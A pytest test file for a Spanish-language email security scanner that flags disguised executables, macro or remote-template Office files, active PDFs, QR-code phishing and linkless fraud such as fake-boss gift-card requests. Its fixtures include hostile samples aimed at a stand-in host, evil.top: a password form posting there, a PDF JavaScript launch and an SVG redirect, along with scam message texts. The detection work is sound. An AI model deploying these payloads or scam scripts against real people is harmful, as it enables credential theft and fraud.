"""Adjuntos (contenido real), códigos QR (quishing) y fraude sin enlaces: piezas puras y el motor completo."""
from __future__ import annotations

import io
import zipfile
import zlib

import numpy as np
import pytest
import zxingcpp
from PIL import Image

from centinela.adaptadores.salida.inspector_adjuntos import InspectorAdjuntos, tipo_por_firma
from centinela.adaptadores.salida.lector_correo import LectorCorreoMime
from centinela.aplicacion.casos_uso.analisis import MotorAnalisis
from centinela.dominio.correo import Adjunto, CorreoParseado, Enlace, OrigenEnlace, SenalAdjunto
from centinela.dominio.dominios import dominio_parecido
from centinela.dominio.entidades import CatalogoEntidades, Entidad
from centinela.dominio.fraude import ContextoDestinatario, SenalFraude, evaluar_fraude, senales_de_texto
from centinela.dominio.reglas import APORTE_INEQUIVOCO, evaluar_reglas, riesgo_adjunto
from centinela.dominio.riesgo import Area, Gravedad, NivelRiesgo, Razon, combinar_riesgo
from tests.gmail_falso import correo

CATALOGO = CatalogoEntidades([Entidad(1, "Bancolombia", "banco", ("bancolombia",), ("bancolombia.com",)),
                              Entidad(2, "DIAN", "gobierno", ("dian",), ("dian.gov.co",))])
AUTH = "mx.google.com; dkim=pass; spf=pass; dmarc=pass"
INSPECTOR = InspectorAdjuntos()
LECTOR = LectorCorreoMime(b"clave", INSPECTOR)


def qr_png(texto: str, lado: int = 420, formato: str = "PNG") -> bytes:
    codigo = zxingcpp.write_barcode_to_image(zxingcpp.create_barcode(texto, zxingcpp.BarcodeFormat.QRCode), scale=5)
    lienzo = Image.new("RGB", (lado, lado), "white")
    lienzo.paste(Image.fromarray(np.array(codigo)).convert("RGB"), (30, 30))
    salida = io.BytesIO()
    lienzo.save(salida, formato)
    return salida.getvalue()


def un_zip(archivos: dict[str, bytes], cifrado: bool = False) -> bytes:
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        for nombre, datos in archivos.items():
            z.writestr(nombre, datos)
    datos = bytearray(b.getvalue())
    if cifrado:                                  # zipfile no cifra: se marca el bit «cifrado» como lo haría 7-Zip
        datos[6] |= 1
        datos[datos.find(b"PK\x01\x02") + 8] |= 1
    return bytes(datos)


def un_pdf(objetos: list[bytes]) -> bytes:
    cuerpo = b"%PDF-1.7\n" + b"\n".join(objetos) + b"\ntrailer\n<< /Root 1 0 R >>\n%%EOF"
    return cuerpo


def flujo(contenido: bytes) -> bytes:
    comprimido = zlib.compress(contenido)
    return b"5 0 obj\n<< /Filter /FlateDecode /Length " + str(len(comprimido)).encode() + b" >>\nstream\n" + comprimido + \
        b"\nendstream\nendobj"


def senales(nombre: str, datos: bytes) -> set[SenalAdjunto]:
    return set(INSPECTOR.inspeccionar(nombre, "application/octet-stream", datos).senales)


# ---------------------------------------------------------------------- tipo real de un archivo
@pytest.mark.parametrize(("datos", "tipo"), [
    (b"MZ\x90\x00", "ejecutable"), (b"\x7fELF\x02", "ejecutable"), (b"%PDF-1.4\n", "pdf"), (b"PK\x03\x04xx", "zip"),
    (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1", "ole"), (b"Rar!\x1a\x07\x00", "rar"), (b"\x89PNG\r\n\x1a\n", "png"),
    (b"\xff\xd8\xff\xe0", "jpeg"), (b"  <!DOCTYPE html><html>", "html"), (b'<?xml version="1.0"?><svg xmlns="x">', "svg"),
    (b"L\x00\x00\x00\x01\x14\x02\x00", "lnk"), (b"hola, esto es texto", None)])
def test_tipo_por_firma(datos, tipo):
    assert tipo_por_firma(datos) == tipo


# ---------------------------------------------------------------------- inspección de adjuntos
def test_programa_disfrazado_de_pdf():
    s = senales("embargo_DIAN.pdf", b"MZ\x90\x00" + b"\x00" * 64)
    assert {SenalAdjunto.EJECUTABLE, SenalAdjunto.DISFRAZADO} <= s
    a = Adjunto("embargo_DIAN.pdf", "application/pdf", 68, tipo_real="ejecutable", senales=tuple(s))
    gravedad, texto, aporte = riesgo_adjunto(a)
    assert gravedad is Gravedad.ALTA and "en realidad un programa" in texto and aporte == APORTE_INEQUIVOCO


def test_pagina_web_disfrazada_de_pdf():
    s = senales("factura.pdf", b"<html><body>Factura</body></html>")
    a = Adjunto("factura.pdf", "application/pdf", 10, tipo_real="html", senales=tuple(s))
    assert SenalAdjunto.DISFRAZADO in s and "en realidad es una página web" in riesgo_adjunto(a)[1]


def test_comprimido_con_programa_adentro():
    insp = INSPECTOR.inspeccionar("factura.zip", "application/zip", un_zip({"Factura_Octubre.pdf.exe": b"MZ" + b"\x00" * 99}))
    assert insp.tipo_real == "zip" and SenalAdjunto.COMPRIMIDO_PELIGROSO in insp.senales
    a = Adjunto("factura.zip", "application/zip", 1, tipo_real="zip", senales=insp.senales, contenido=insp.contenido)
    assert "«Factura_Octubre.pdf.exe»" in riesgo_adjunto(a)[1]


def test_comprimido_dentro_de_comprimido():
    interno = un_zip({"pago.js": b"alert(1)"})
    assert SenalAdjunto.COMPRIMIDO_PELIGROSO in senales("docs.zip", un_zip({"docs.zip": interno}))


def test_comprimido_con_clave_y_comprimido_normal():
    assert SenalAdjunto.CIFRADO in senales("extracto.zip", un_zip({"extracto.pdf": b"%PDF-1.4"}, cifrado=True))
    assert senales("fotos.zip", un_zip({"foto1.jpg": b"\xff\xd8\xff", "foto2.jpg": b"\xff\xd8\xff"})) == set()
    a = Adjunto("fotos.zip", "application/zip", 1, tipo_real="zip")
    assert riesgo_adjunto(a)[0] is Gravedad.MEDIA                 # por ser comprimido, nada más


def test_documentos_de_office_con_macros_y_plantilla_remota():
    docm = un_zip({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w/>", "word/vbaProject.bin": b"\x00"})
    insp = INSPECTOR.inspeccionar("contrato.docx", "application/vnd.openxmlformats", docm)
    assert insp.tipo_real == "ooxml" and SenalAdjunto.MACROS in insp.senales and insp.contenido == ()
    rels = (b'<Relationships><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
            b'attachedTemplate" Target="http://evil.top/plantilla.dotm" TargetMode="External"/></Relationships>')
    remota = un_zip({"[Content_Types].xml": b"<Types/>", "word/_rels/settings.xml.rels": rels})
    assert SenalAdjunto.PLANTILLA_REMOTA in senales("hoja_de_vida.docx", remota)
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 100 + "_VBA_PROJECT".encode("utf-16-le") + b"\x00" * 50
    assert SenalAdjunto.MACROS in senales("nomina.xls", ole)
    normal = un_zip({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w/>"})
    assert senales("acta.docx", normal) == set()


def test_pdf_con_javascript_enlaces_y_pdf_normal():
    activo = un_pdf([b"1 0 obj << /Type /Catalog /OpenAction 5 0 R >> endobj",
                     flujo(b"<< /S /JavaScript /JS (app.launchURL('http://evil.top')) >>")])
    insp = INSPECTOR.inspeccionar("extracto.pdf", "application/pdf", activo)
    assert SenalAdjunto.PDF_JAVASCRIPT in insp.senales

    con_enlace = un_pdf([b"1 0 obj << /Type /Catalog >> endobj",
                         flujo(b"<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://bancolombia-pagos.top/x) >> >>")])
    insp = INSPECTOR.inspeccionar("pago.pdf", "application/pdf", con_enlace)
    assert insp.senales == () and insp.enlaces == ("https://bancolombia-pagos.top/x",)

    oculto = un_pdf([b"1 0 obj << /Type /Catalog /Names << /EmbeddedFiles 2 0 R >> >> endobj"])
    a = Adjunto("anexo.pdf", "application/pdf", 1, tipo_real="pdf", senales=tuple(senales("anexo.pdf", oculto)))
    assert riesgo_adjunto(a)[0] is Gravedad.MEDIA

    con_clave = un_pdf([b"1 0 obj << /Type /Catalog >> endobj", b"trailer << /Encrypt 9 0 R >>"])
    assert riesgo_adjunto(Adjunto("extracto.pdf", "application/pdf", 1, tipo_real="pdf",
                                  senales=tuple(senales("extracto.pdf", con_clave)))) is None


def test_pdf_bomba_no_agota_la_memoria():
    bomba = un_pdf([flujo(b"\x00" * 50_000_000)])          # 50 MB que comprimidos ocupan ~50 KB
    insp = INSPECTOR.inspeccionar("bomba.pdf", "application/pdf", bomba)
    assert insp.tipo_real == "pdf"


def test_paginas_y_svg_adjuntos():
    formulario = b'<html><form action="https://evil.top/p"><input type="password" name="c"></form></html>'
    insp = INSPECTOR.inspeccionar("Documento.html", "text/html", formulario)
    assert SenalAdjunto.FORMULARIO in insp.senales and insp.enlaces == ("https://evil.top/p",)
    svg = b'<svg xmlns="http://www.w3.org/2000/svg" onload="location=\'https://evil.top\'"><text>Pago</text></svg>'
    insp = INSPECTOR.inspeccionar("comprobante.svg", "image/svg+xml", svg)
    assert SenalAdjunto.SCRIPT in insp.senales
    assert insp.enlaces == ("https://evil.top",)                             # el w3.org del SVG no es un enlace
    a = Adjunto("comprobante.svg", "image/svg+xml", 1, tipo_real="svg", senales=insp.senales)
    assert riesgo_adjunto(a)[0] is Gravedad.ALTA


def test_adjuntos_comunes_no_alarman():
    assert riesgo_adjunto(Adjunto("foto.jpg", "image/jpeg", 10, tipo_real="jpeg")) is None
    assert riesgo_adjunto(Adjunto("informe.pdf", "application/pdf", 10, tipo_real="pdf")) is None


# ---------------------------------------------------------------------- códigos QR
def test_lee_qr_de_imagenes_y_descarta_lo_que_no_es_un_enlace():
    assert INSPECTOR.qr_de_imagen(qr_png("https://ms365-login.top/auth")) == ("https://ms365-login.top/auth",)
    assert INSPECTOR.qr_de_imagen(qr_png("https://x.co/a", formato="JPEG")) == ("https://x.co/a",)
    assert INSPECTOR.qr_de_imagen(qr_png("WIFI:S:Casa;T:WPA;P:clave;;")) == ()
    assert INSPECTOR.qr_de_imagen(b"no es una imagen") == ()
    assert INSPECTOR.qr_de_imagen(b"\x89PNG\r\n\x1a\n" + b"\x00" * 50) == ()       # imagen dañada


def test_imagen_gigante_no_se_procesa():
    b = io.BytesIO()
    Image.new("L", (6000, 6000), 255).save(b, "PNG")
    assert INSPECTOR.qr_de_imagen(b.getvalue()) == ()


def test_quishing_qr_en_imagen_del_cuerpo():
    crudo = correo(remitente="Soporte Microsoft 365 <no-reply@ms365-secure.com>", asunto="Acción requerida",
                   cuerpo="Su verificación vence hoy. Escanee el código QR con su celular para mantener el acceso.",
                   autenticacion=AUTH, adjuntos=[("codigo.png", qr_png("https://ms365-login.top/auth?u=1"), "image/png")])
    c = LECTOR.leer(crudo)
    assert c.enlaces[0] == Enlace("https://ms365-login.top/auth?u=1", "", OrigenEnlace.QR, "codigo.png")
    assert SenalAdjunto.CODIGO_QR in c.adjuntos[0].senales
    r = evaluar_reglas(c, CATALOGO)
    qr = next(x for x in r.razones if "código QR" in x.texto)
    assert qr.area is Area.ENLACE and qr.gravedad is Gravedad.ALTA and "ms365-login.top" in qr.texto
    assert any(x.texto.startswith("El código QR lleva a ms365-login.top, una terminación") for x in r.razones)


def test_los_adjuntos_no_cambian_los_datos_del_remitente():
    c = LECTOR.leer(correo(remitente="Facturación Proveedor <facturas@proveedor.co>", asunto="Factura",
                           cuerpo="Adjunto la factura.", adjuntos=[("Factura.zip", un_zip({"a.pdf": b"%PDF"}), "application/zip"),
                                                                    ("qr.png", qr_png("https://x.co/a"), "image/png")]))
    assert (c.remitente_nombre, c.remitente_correo) == ("Facturación Proveedor", "facturas@proveedor.co")
    assert [a.nombre for a in c.adjuntos] == ["Factura.zip", "qr.png"]


def test_qr_en_imagen_incrustada_en_el_html():
    from email.message import EmailMessage
    m = EmailMessage()
    m["From"], m["To"], m["Subject"] = "RRHH <rrhh@nomina-empresa.co>", "ana@gmail.com", "Bono de fin de año"
    m.set_content("Revise su bono.")
    m.add_alternative('<p>Escanea para ver tu bono:</p><img src="cid:qr1">', subtype="html")
    m.get_payload()[1].add_related(qr_png("https://bono-nomina.click/login"), "image", "png", cid="<qr1>")
    c = LECTOR.leer(m.as_bytes())
    assert [(e.url, e.origen) for e in c.enlaces] == [("https://bono-nomina.click/login", OrigenEnlace.QR)]
    assert c.adjuntos == ()                                  # la imagen del cuerpo no se cuenta como adjunto


def test_qr_oficial_o_del_mismo_remitente_no_se_marca():
    factura = correo(remitente="Almacenes <facturas@almacenes.com.co>", asunto="Factura electrónica FE-12",
                     cuerpo="Adjuntamos su factura electrónica.", autenticacion=AUTH,
                     adjuntos=[("qr.png", qr_png("https://catalogo-vpfe.dian.gov.co/document/searchqr?documentkey=1"),
                                "image/png")])
    propio = correo(remitente="Eventos <boletas@eventos.co>", asunto="Tu boleta", cuerpo="Presenta este código.",
                    autenticacion=AUTH, adjuntos=[("boleta.png", qr_png("https://www.eventos.co/b/123"), "image/png")])
    for crudo in (factura, propio):
        assert not [x for x in evaluar_reglas(LECTOR.leer(crudo), CATALOGO).razones if "QR" in x.texto]


def test_qr_dentro_de_un_pdf():
    jpeg = qr_png("https://pago-seguro.top/factura", formato="JPEG")
    pdf = un_pdf([b"1 0 obj << /Type /Catalog >> endobj",
                  b"6 0 obj\n<< /Type /XObject /Subtype /Image /Filter /DCTDecode /Length " + str(len(jpeg)).encode() +
                  b" >>\nstream\n" + jpeg + b"\nendstream\nendobj"])
    insp = INSPECTOR.inspeccionar("factura.pdf", "application/pdf", pdf)
    assert insp.qr == ("https://pago-seguro.top/factura",) and SenalAdjunto.CODIGO_QR in insp.senales


# ---------------------------------------------------------------------- fraude sin enlaces
def _correo(asunto, cuerpo, remitente="Carlos <carlos.gerente@gmail.com>", **kw) -> CorreoParseado:
    return LECTOR.leer(correo(remitente=remitente, asunto=asunto, cuerpo=cuerpo, autenticacion=AUTH, **kw))


def test_senales_del_texto():
    s = senales_de_texto("Urgente", "¿Estás disponible? Necesito que hagas una transferencia hoy mismo, es confidencial."
                                    "\n\nCarlos\nGerente General")
    assert s == {SenalFraude.APERTURA, SenalFraude.PAGO, SenalFraude.URGENCIA, SenalFraude.SECRETO, SenalFraude.AUTORIDAD}
    assert senales_de_texto("Novedades", "El producto ya está disponible en la tienda.") == frozenset()
    assert SenalFraude.AUTORIDAD not in senales_de_texto("x", "El director de la película ganó un premio.\n" + "linea\n" * 8)


def test_tarjetas_de_regalo_de_un_falso_jefe():
    c = _correo("Favor urgente", "Hola, ¿estás disponible? Estoy en reunión y no puedo atender llamadas. Compra 5 tarjetas "
                                 "de regalo de Google Play y envíame los códigos lo antes posible.\n\nCarlos\nGerente")
    ev = evaluar_fraude(c, ContextoDestinatario("ana@gmail.com", remitente_conocido=False))
    assert ev.razon.area is Area.FRAUDE and ev.razon.gravedad is Gravedad.ALTA and ev.razon.aporte == 0.75
    assert "tarjetas de regalo" in ev.razon.texto and "primera vez" in ev.razon.texto


def test_cambio_de_cuenta_bancaria_de_un_proveedor_con_dominio_parecido():
    c = _correo("Datos bancarios", "Les informamos que cambiamos nuestra cuenta bancaria. Por favor consignar las facturas "
                                   "a la nueva cuenta de ahorros.", remitente="Cartera <cartera@acme-co.com>")
    ev = evaluar_fraude(c, ContextoDestinatario("pagos@acme.co"))
    assert ev.razon.gravedad is Gravedad.ALTA and "imita al de tu organización (acme.co)" in ev.razon.texto


def test_extorsion_en_bitcoin():
    c = _correo("Tengo un video tuyo", "Grabé un video tuyo. Paga 500 USD en bitcoin o enviaré el video a todos tus "
                                       "contactos.", remitente="x <x@protonmail.com>")
    ev = evaluar_fraude(c)
    assert ev.razon.gravedad is Gravedad.ALTA and "extorsión" in ev.razon.texto and "no trae enlaces" in ev.razon.texto


@pytest.mark.parametrize(("asunto", "cuerpo", "remitente", "conocido"), [
    ("Recordatorio", "Te recordamos que tu factura vence el 25. Puedes realizar el pago por PSE.",
     "Claro <facturacion@claro.com.co>", True),
    ("Paseo", "Ya hice la transferencia de mi parte del paseo, me confirmas cuando te llegue.", "Laura <laura@gmail.com>",
     True),
    ("Hola", "¿Estás disponible el sábado para el cumpleaños?", "Laura <laura@gmail.com>", True),
    ("Pedido", "Tu pedido ya está disponible. Gracias por tu compra.", "Tienda <pedidos@tienda.co>", None),
])
def test_correos_normales_de_dinero_no_se_marcan(asunto, cuerpo, remitente, conocido):
    assert evaluar_fraude(_correo(asunto, cuerpo, remitente), ContextoDestinatario("ana@gmail.com", conocido)).razon is None


def test_remitente_verificado_necesita_mucho_mas():
    c = _correo("Pago", "Necesito que hagas el pago urgente, es confidencial.", remitente="Banco <x@bancolombia.com>")
    assert evaluar_fraude(c).razon is not None
    assert evaluar_fraude(c, remitente_verificado=True).razon is None


def test_dominio_parecido():
    assert dominio_parecido("acme-co.com", "acme.co") and dominio_parecido("rnicrosoft.com", "microsoft.com")
    assert dominio_parecido("empresa.net", "empresa.com.co")
    assert not dominio_parecido("correo.empresa.co", "empresa.co") and not dominio_parecido("gmail.com", "empresa.co")
    assert not dominio_parecido("abc.co", "abd.co")              # nombres cortos: demasiado parecido por azar


def test_el_peso_propio_de_una_regla_entra_al_riesgo_tecnico():
    fuerte = Razon(Area.FRAUDE, Gravedad.ALTA, "x", aporte=0.75)
    assert combinar_riesgo(None, None, [fuerte]).p_final == 0.75
    assert combinar_riesgo(None, None, [Razon(Area.ADJUNTO, Gravedad.ALTA, "x", aporte=None)]).p_final == 0.45


# ---------------------------------------------------------------------- motor completo (solo reglas)
class _SinModelos:
    def contenido(self):
        return None

    def enlaces(self):
        return None


@pytest.mark.parametrize(("crudo", "area"), [
    (correo(remitente="Gerente <gerente.empresa@gmail.com>", asunto="Urgente",
            cuerpo="¿Estás disponible? Necesito que compres tarjetas de regalo de Amazon y me envíes los códigos ya. "
                   "Es confidencial.", autenticacion=AUTH), Area.FRAUDE),
    (correo(remitente="Facturación <facturas@proveedor.co>", asunto="Factura", cuerpo="Adjunto la factura.",
            autenticacion=AUTH, adjuntos=[("factura.zip", un_zip({"factura.pdf.exe": b"MZ" + b"\x00" * 50}),
                                           "application/zip")]), Area.ADJUNTO),
])
def test_motor_marca_peligrosos_sin_ningun_enlace(crudo, area):
    r = MotorAnalisis(_SinModelos()).analizar(LECTOR.leer(crudo), CATALOGO, ContextoDestinatario("ana@gmail.com", False))
    assert r.veredicto.nivel is NivelRiesgo.ALTO
    assert r.veredicto.razones_visibles[0].area is area


def test_motor_guarda_el_origen_de_cada_enlace():
    class Enlaces:
        modelo_id = 9

        def evaluar(self, urls):
            from centinela.aplicacion.puertos import EvaluacionEnlace
            return [EvaluacionEnlace(u, u.split("/")[2], 0.9) for u in urls]

    class Modelos(_SinModelos):
        def enlaces(self):
            return Enlaces()

    crudo = correo(remitente="x <x@ms365-secure.com>", asunto="Escanee", cuerpo="Escanee el QR. Más en https://a.co/b",
                   autenticacion=AUTH, adjuntos=[("q.png", qr_png("https://ms365-login.top/a"), "image/png")])
    r = MotorAnalisis(Modelos()).analizar(LECTOR.leer(crudo), CATALOGO)
    assert [(e.dominio, e.origen) for e in r.enlaces] == [("ms365-login.top", "qr"), ("a.co", "cuerpo")]
